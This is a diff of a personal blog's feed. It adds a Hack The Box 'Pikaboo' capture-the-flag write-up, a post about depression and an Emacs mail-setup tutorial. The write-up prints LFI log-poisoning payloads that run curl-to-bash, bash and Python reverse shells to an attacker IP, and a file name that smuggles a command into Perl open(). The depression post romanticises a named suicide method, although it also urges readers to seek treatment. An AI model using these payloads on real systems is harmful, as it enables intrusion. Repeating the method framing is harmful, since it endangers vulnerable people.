@@ -1,4 +1,239 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2021-08-28T01:30:38+01:00</updated><id>/feed.xml</id><title type="html">Ybenel</title><subtitle>Where Knowledge is peace of cake.</subtitle><author><name>Ybenel</name></author><entry><title type="html">The End</title><link href="/theend/2021/08/27/Suicide.html" rel="alternate" type="text/html" title="The End" /><published>2021-08-27T00:00:00+01:00</published><updated>2021-08-27T00:00:00+01:00</updated><id>/theend/2021/08/27/Suicide</id><content type="html" xml:base="/theend/2021/08/27/Suicide.html">&lt;h3 id=&quot;lyrics-dedicated-to-those-whove-done-enough&quot;&gt;Lyrics Dedicated To Those Who’ve Done Enough.&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2021-09-21T21:46:07+01:00</updated><id>/feed.xml</id><title type="html">Ybenel</title><subtitle>Where Knowledge is peace of cake.</subtitle><author><name>Ybenel</name></author><entry><title type="html">HTB - Pikaboo</title><link href="/htb/2021/09/17/Pikaboo.html" rel="alternate" type="text/html" title="HTB - Pikaboo" /><published>2021-09-17T00:00:00+01:00</published><updated>2021-09-17T00:00:00+01:00</updated><id>/htb/2021/09/17/Pikaboo</id><content type="html" xml:base="/htb/2021/09/17/Pikaboo.html">&lt;p&gt;A Hard Machine That Consist On Exploiting MisConfigurations&lt;/p&gt;
+
+&lt;p&gt;&lt;a id=&quot;orga478a8e&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;slim-to-none&quot;&gt;Slim To None&lt;/h1&gt;
+
+&lt;p&gt;&lt;a id=&quot;orgbd954f4&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;general-enumeration&quot;&gt;General Enumeration&lt;/h2&gt;
+
+&lt;p&gt;&lt;a id=&quot;orga965546&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;open-ports&quot;&gt;Open Ports&lt;/h3&gt;
+
+&lt;p&gt;21 (vstpd 3.0.3) - 22 (SSH), 80 (Nginx), 8081 (py HTTP)&lt;/p&gt;
+
+&lt;p&gt;&lt;a id=&quot;orgac5402c&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-enum&quot;&gt;Initial Enum&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Web (80), Has Auth&lt;sub&gt;Basic&lt;/sub&gt; (redirect to 401)&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Confirmed Path Manipulation (Bypass 401) in /admin&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.249/admin../server-status
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a id=&quot;orgde05944&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;usernames-and-passwords&quot;&gt;Usernames And Passwords&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;No Credentials Found&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a id=&quot;orgd93d112&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;interesting-discoveries&quot;&gt;Interesting Discoveries&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;admin page (&lt;a href=&quot;http://10.10.10.249/admin&quot;&gt;http://10.10.10.249/admin&lt;/a&gt;) [Requires Credentials]&lt;/li&gt;
+  &lt;li&gt;weird path /admin/admin&lt;sub&gt;staging&lt;/sub&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a id=&quot;orgd7cc00c&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerabilities-and-exploitation&quot;&gt;Vulnerabilities And Exploitation&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Possible Exploitation Path&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;proof&quot; id=&quot;orgc2a0a36&quot;&gt;
+&lt;p&gt;
+log poisoning lead to RCE through
+LFI -&amp;gt; (Cache VSFTPD) -&amp;gt; RCE
+&lt;/p&gt;
+
+&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Exploitation Of (Log Poisoning)
+    &lt;ol&gt;
+      &lt;li&gt;We do have LFI &lt;a href=&quot;http://10.10.10.249/admin../admin_staging/index.php?page=&quot;&gt;admin&lt;sub&gt;staging&lt;/sub&gt;&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;We Have A Valid Log file (/var/log/vsftpd.log)&lt;/li&gt;
+      &lt;li&gt;Payload
+        &lt;ol&gt;
+          &lt;li&gt;USER Field
+            &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;curl http://10.10.14.210:8000/rev | bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
+          &lt;/li&gt;
+          &lt;li&gt;Inside Of rev
+            &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+    /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.210/9110 0&amp;gt;&amp;amp;1&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
+          &lt;/li&gt;
+          &lt;li&gt;Curl The Path
+            &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    curl http://10.10.10.249/admin../admin_staging/index.php
+    ?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/log/vsftpd.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
+          &lt;/li&gt;
+        &lt;/ol&gt;
+      &lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Grab User.txt
+&lt;img src=&quot;https://ybenel.cf/imgs/pikaboo/user_flag.png&quot; alt=&quot;img&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a id=&quot;org0744151&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;user-enumeration&quot;&gt;User Enumeration&lt;/h2&gt;
+
+&lt;p&gt;&lt;a id=&quot;org4820c84&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;interesting--discoveries&quot;&gt;Interesting  Discoveries&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cronjob (root) /usr/local/bin/csvupdate&lt;sub&gt;cron&lt;/sub&gt;&lt;/li&gt;
+  &lt;li&gt;/etc/apache2/htpasswd (HTPass Auth Basic) (Salted MD5)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a id=&quot;orge0cdc6b&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;passwords&quot;&gt;Passwords&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;xxj31ZMTZzkVA (/etc/apache2/sites-available/default-ssl.conf)&lt;/li&gt;
+  &lt;li&gt;Salted MD5 ($apr1$0.2FVvEK$Xn42uf/ySS5IPTKXfebXM.) [Not Cracked]&lt;/li&gt;
+  &lt;li&gt;J~42%W?PFHl]g (Ldap /opt/pokeapi/config/settings.py)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;a id=&quot;org9d946cd&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Grabing User Password Through Ldap&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch -x -h 127.0.0.1 -D &apos;cn=binduser,ou=users,dc=pikaboo,dc=htb&apos; -w J~42%W?PFHl]g -b &apos;dc=ftp,dc=pikaboo,dc=htb&apos;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;p&gt;pwnmeow user&lt;/p&gt;
+
+        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# pwnmeow, users, ftp.pikaboo.htb
+dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+uid: pwnmeow
+cn: Pwn
+sn: Meow
+loginShell: /bin/bash
+uidNumber: 10000
+gidNumber: 10000
+homeDirectory: /home/pwnmeow
+userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
+    
+echo -n X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
+_G0tT4_C4tcH_&apos;3m_4lL!_
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a id=&quot;org32b305e&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;&lt;a id=&quot;org42aa660&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerabities-exploitation&quot;&gt;Vulnerabities Exploitation&lt;/h3&gt;
+
+&lt;p&gt;From The Previous Cronjobs We found we noticed there’s a script /usr/local/bin/csvupdate&lt;sub&gt;cron&lt;/sub&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;d &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /srv/ftp/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;do
+      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;
+      /usr/local/bin/csvupdate &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;csv
+      /usr/bin/rm &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Essentially What the script does is that it lists all the folders exist in /srv/ftp and takes all csv files
+and directs them as argument to another script called csvupdate.
+Now as we read the perl script, we noticed it does use open() function to open files, However
+after little bit of documentation reading we noticed that, if two filenames specified , if one had pipe symbol “|”
+it will be interpreted as command thus being executed it.
+Now Our Root Path has become more clear to what we should do.
+I Found this stack overflow &lt;a href=&quot;https://stackoverflow.com/questions/26614348/perl-open-injection-prevention&quot;&gt;discussion&lt;/a&gt; which demonstrate , how we can achieve this. Unfortunately this was not that simple!
+Bash commands were not suitable for this coz of being executed before even attempting to run them, and it the idea was to craft a malicious payload that will be a name of empty file that we will upload to pwnmeow user’s ftp as we got his credentials previously.
+Other thing was to create a temporary file that has our payload which we can then execute by calling its full path, tho the issue is that we cannot create filename’s as a path , which left us we fewer options.
+Since Python was available, we can use a oneliner reverse shell as our payload , tho it had to be really perfect specially with escaping double quotes.
+I Used the following oneliner reverse shell&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.210&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(&quot;sh&quot;);&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;After Editing it to escape double quotes and create an empty file&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;/span&gt;\&lt;span class=&quot;s&quot;&gt;&quot;10.10.14.210&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;;.csv&quot;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Then we go back to ftp and upload it, &lt;strong&gt;ONE BIG FAT WARNING&lt;/strong&gt; If you tried to upload the file to the root folder, it will not work and file will not be uploaded, and you’ll get really frustrated on why not it didn’t work like myself lol.
+Choose any folder , it doesn’t matter which one and upload it to it .
+&lt;img src=&quot;https://ybenel.cf/imgs/pikaboo/ftp_upload.png&quot; alt=&quot;img&quot; /&gt;
+&lt;strong&gt;Notice&lt;/strong&gt; in ur listener it will first connect back from ur machine , kill it immediately and re-run your listener, After few seconds
+You’ll receive a
+&lt;img src=&quot;https://ybenel.cf/imgs/pikaboo/root_flag.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="HTB" /><category term="HTB" /><category term="Hard" /><category term="Logs" /><category term="LFI" /><category term="Poisoning" /><category term="Misconfigurations" /><summary type="html">A Hard Machine That Consist On Exploiting MisConfigurations</summary></entry><entry><title type="html">The Pre Sequal</title><link href="/presequal/2021/09/07/Pre-Sequal.html" rel="alternate" type="text/html" title="The Pre Sequal" /><published>2021-09-07T00:00:00+01:00</published><updated>2021-09-07T00:00:00+01:00</updated><id>/presequal/2021/09/07/Pre-Sequal</id><content type="html" xml:base="/presequal/2021/09/07/Pre-Sequal.html">&lt;h3 id=&quot;suicide-spaceship&quot;&gt;Suicide Spaceship.&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;To be honest i don&apos;t even know from where to start .
+This is a sequel with no story but with aligned splash of eternal pain
+I&apos;ve been looking to fulfill my destiny which turned into a dark way
+The Amount of pain that is caused is beyond what i can handle
+   
+when hearing about mental disorders, I&apos;d laugh about it
+but never realized i might get it or had it myself
+It eats you slowly from deep inside just like cancer
+yet it is worst than cancer, cause there&apos;s a slightly chance slim to none
+
+you&apos;ll get back recovered as some disorders are lifetime :(
+it begins when you start by your willingness disconnecting from the world around you
+Creating an isolating environment for yourself only .
+As my younger self , i had plenty of close friends which i used to hang out with all the time
+And i mean like a lot, we are still friends but not like we used to be
+it has been so long since I&apos;ve hanged out or meet any of them we barely even talk
+
+Well i barely i guess, and it is not just friends, even Ur own family
+I&apos;ve tried so hard to avoid my own family , i don&apos;t talk that much only when i have to
+I avoid occasions special events , family meet ups . as it is a natural necessary action
+by reaching this state, Ur mind and body just flows inside of an infinite maze with no way out
+yourself becomes another entity , and you wouldn&apos;t believe what can u do.
+Your conscience will start acting on its own and you&apos;ll have no control over it,
+when feeling danger of exposing your sense, it lies to cover up its state and gets violent when being pushed.
+You start living a lie believing in something that never happened and ensuring yourself that you&apos;re good and doing the right thing.
+
+After yourself is locked away you&apos;ll be anti-social and facing post traumatic disorder, stress and anxiety start kicking .
+your chest will start getting heavier feeling burnout from inside and that&apos;s where pain takes its place , it feels like putting a ton of weight on Ur chest and cannot stand up
+you&apos;ll start thinking about cutting Ur chest open and left out the weight , and yes that is suicidal thoughts
+I&apos;ve had so many suicidal thoughts and how to achieve them , one of the easier ways is just by jumping off a building .
+Feeling the hair blows on Ur face while enjoying Ur last moment in peace before dying.
+Crying is another thing, you cry randomly with no reason which is another mental condition caused by stress, deep depressing and more awful things.
+Feeling guilt for your own self , it shows how deeply you&apos;re affected . one thing good about crying is that u feel less bad and stressed but not that much
+i cry at anytime and absolutely i do hide it , nobody sees and no one should or find out .
+
+When being out for extreme condition, communicating is really hard after being anti-social and never talking with anybody took out some skills.
+fun fact, even simple words don&apos;t wanna come out of your mouth, being speechless and your voice also changes it becomes less heard .
+when being in isolation, you think you aren&apos;t hurting or disrupting while in most cases u doing more damage than u could .
+i don&apos;t blame people who hated me either for lying or some way indirectly , i can&apos;t say i can control the way things goes I&apos;m tied up.
+Drifting away in an infinite loop for no purpose.
+As Mental illness is no joke, i feel drowning in my left lifespan hoping someone catches my hand and pull me out of the misery I&apos;m in , there&apos;s only 2 ways either i kill it or it kills me 
+Tip: Do not hesitate getting treatment ASAP , don&apos;t be like me I&apos;ve ignored it too much and its now killing me slow :)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="PreSequal" /><category term="PreSequal" /><category term="Beginning" /><category term="Psychology" /><category term="Disorder" /><category term="Illness" /><summary type="html">Suicide Spaceship.</summary></entry><entry><title type="html">The End</title><link href="/theend/2021/08/27/Suicide.html" rel="alternate" type="text/html" title="The End" /><published>2021-08-27T00:00:00+01:00</published><updated>2021-08-27T00:00:00+01:00</updated><id>/theend/2021/08/27/Suicide</id><content type="html" xml:base="/theend/2021/08/27/Suicide.html">&lt;h3 id=&quot;lyrics-dedicated-to-those-whove-done-enough&quot;&gt;Lyrics Dedicated To Those Who’ve Done Enough.&lt;/h3&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I&apos;ve always kept wondering what&apos;s with me .
 I have been through the nether
@@ -218,77 +453,306 @@ Our demise so true when the lies be coming true.
 
 &lt;ul&gt;
   &lt;li&gt;And That’s Pretty Much The Box , Hope You Enjoyed Reading Take Care And i’ll see you all other time :)&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="THM" /><category term="THM" /><category term="Medium" /><summary type="html">CMSpit Is a medium linux machine that consist of identifying vulnerabilties related to web CMS framework that includes information gathering,user enumeration,privilege escalation.</summary></entry><entry><title type="html">How To Setup Mail In Emacs</title><link href="/emacs/2021/07/23/Emacs-Mail-Setup.html" rel="alternate" type="text/html" title="How To Setup Mail In Emacs" /><published>2021-07-23T00:00:00+01:00</published><updated>2021-07-23T00:00:00+01:00</updated><id>/emacs/2021/07/23/Emacs-Mail-Setup</id><content type="html" xml:base="/emacs/2021/07/23/Emacs-Mail-Setup.html">&lt;p&gt;If you’re an emacs user and love using emacs for literally everything , then you are in the right place.
+&lt;/ul&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="THM" /><category term="THM" /><category term="Medium" /><summary type="html">CMSpit Is a medium linux machine that consist of identifying vulnerabilties related to web CMS framework that includes information gathering,user enumeration,privilege escalation.</summary></entry><entry><title type="html">How To Setup Mail In Emacs</title><link href="/emacs/2021/07/23/Emacs-Mail-Setup.html" rel="alternate" type="text/html" title="How To Setup Mail In Emacs" /><published>2021-07-23T00:00:00+01:00</published><updated>2021-09-21T00:00:00+01:00</updated><id>/emacs/2021/07/23/Emacs-Mail-Setup</id><content type="html" xml:base="/emacs/2021/07/23/Emacs-Mail-Setup.html">&lt;p&gt;If you’re an emacs user and love using emacs for literally everything , then you are in the right place.
 In This Short Tutorial we are gonna learn how to setup Mu4e In Emacs From Scratch.&lt;/p&gt;
 
 &lt;h2 id=&quot;installing-mu4e&quot;&gt;Installing Mu4e&lt;/h2&gt;
-&lt;p&gt;There’s a lot of ways to install mu4e in emacs , one of the easiest ways to do it if you have &lt;strong&gt;doom emacs&lt;/strong&gt; installed is to edit packages.el and uncomment the mail option .
-the other way is to use the &lt;strong&gt;package-install&lt;/strong&gt; in emacs, to do this open selection by pressing &lt;strong&gt;alt+x&lt;/strong&gt; and then type package-install and hit return this will prompt to search for packages to install , simply type mu4e and hit return and it will be installed. once it’s done quit emacs and proceed with the following steps.&lt;/p&gt;
+&lt;p&gt;There’s a lot of ways to install mu4e in emacs , one of the easiest ways to do it if you have &lt;strong&gt;doom emacs&lt;/strong&gt; installed is to edit init.el and uncomment the mail option &lt;em&gt;mu4e&lt;/em&gt;.
+the other way is to install it manually which we will cover it later on in mu installation.&lt;/p&gt;
 
-&lt;h2 id=&quot;installing-offlineimap-and-mu-git&quot;&gt;Installing offlineimap and mu-git&lt;/h2&gt;
-&lt;p&gt;Offlineimap is pre packaged in the official arch repositories, for mu-git there’s AUR build for it .
-To Install both offlineimap and mu-git simply run the following command .&lt;/p&gt;
+&lt;h2 id=&quot;installing-and-mu-git-and-mu4e&quot;&gt;Installing and mu-git and mu4e&lt;/h2&gt;
+&lt;p&gt;In order to index our mail we’ll be using &lt;em&gt;mu&lt;/em&gt; which includes &lt;em&gt;mu4e&lt;/em&gt; for emacs.
+There’s few different ways to install &lt;em&gt;mu&lt;/em&gt; which changes from distribution to another.
+The current stable release is &lt;strong&gt;1.6.6&lt;/strong&gt;, in case u installed 1.7.0 there’s a high chance you’ll be facing few problems and experiencing some bugs , so be sure which version you’re installing .
+In &lt;strong&gt;Arch&lt;/strong&gt; Using &lt;em&gt;AUR&lt;/em&gt; is pretty straight forward.&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yay &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; offlineimap mu-git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In &lt;strong&gt;Debian&lt;/strong&gt; the stable release is 1.4.15 which is really fine really, you can use the instable repositories to install 1.6.*&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mu4e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In Case your distribution doesn’t have &lt;em&gt;mu&lt;/em&gt; on their repositories you can install it from source which is really easy.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;release/1.6&quot;&lt;/span&gt; https://github.com/djcb/mu/
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;mu
+meson &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--buildtype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;plain build
+ninja &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; build &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;installing-isync-or-offlineimap&quot;&gt;Installing Isync Or OfflineImap&lt;/h2&gt;
+&lt;p&gt;Both &lt;em&gt;Isync&lt;/em&gt; And &lt;em&gt;Offlineimap&lt;/em&gt; are great programs to download our mail into our inbox.
+There isn’t really that much difference, it just depends on which one you’d like to install.
+To Install &lt;em&gt;Isync&lt;/em&gt; Or &lt;em&gt;Offlineimap&lt;/em&gt; On &lt;strong&gt;Arch&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pacman &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; isync
+pacman &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; offlineimap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
